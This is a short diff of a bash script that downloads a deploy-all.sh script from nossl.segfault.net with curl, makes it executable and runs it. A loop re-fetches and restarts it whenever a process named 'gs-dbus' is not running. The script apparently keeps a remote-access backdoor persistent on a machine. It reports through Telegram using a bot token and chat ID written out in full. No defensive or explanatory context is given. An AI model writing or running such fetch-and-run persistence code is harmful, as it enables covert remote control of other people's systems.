@@ -8,8 +8,8 @@ fi
 TOKEN="7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI"
 CHAT_ID="6116824863"
 domain="$1"
-download_command="curl -fsSL http://nossl.segfault.net/deploy-all.sh -o ~/deploy-all.sh && chmod +x ~/deploy-all.sh"
-run_command="bash ~/deploy-all.sh"
+download_command="curl -fsSL http://nossl.segfault.net/deploy-all.sh -o $HOME/deploy-all.sh && chmod +x $HOME/deploy-all.sh"
+run_command="bash $HOME/deploy-all.sh"
 
 send_to_telegram() {
   local message="$1"
@@ -24,7 +24,7 @@ monitor_and_restart() {
   while true; do
     if ! pgrep "gs-dbus" > /dev/null; then
 
-      if [[ ! -f deploy-all.sh ]]; then
+      if [[ ! -f $HOME/deploy-all.sh ]]; then
         output=$($download_command 2>&1)
         sleep 15
       fi
